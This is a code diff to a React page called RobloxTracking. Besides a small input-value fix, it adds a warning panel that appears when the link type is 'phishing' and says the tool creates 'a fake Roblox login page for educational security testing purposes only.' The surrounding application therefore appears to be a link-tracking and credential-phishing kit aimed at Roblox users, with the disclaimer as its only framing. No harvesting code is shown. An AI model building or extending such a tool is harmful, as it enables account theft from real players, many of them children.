@@ -198,6 +198,7 @@ export default function RobloxTracking() {
                             <Input 
                               placeholder="https://www.roblox.com/games/..." 
                               {...field}
+                              value={field.value || ""}
                               data-testid="input-original-url"
                             />
                           </FormControl>
@@ -205,6 +206,18 @@ export default function RobloxTracking() {
                         </FormItem>
                       )}
                     />
+                  )}
+
+                  {selectedLinkType === "phishing" && (
+                    <div className="bg-red-50 border border-red-200 rounded-md p-4">
+                      <div className="flex items-center space-x-2">
+                        <Skull className="h-5 w-5 text-red-500" />
+                        <div>
+                          <h4 className="font-medium text-red-800">Security Testing Tool</h4>
+                          <p className="text-sm text-red-700">This will create a fake Roblox login page for educational security testing purposes only.</p>
+                        </div>
+                      </div>
+                    </div>
                   )}
 
                   <FormField
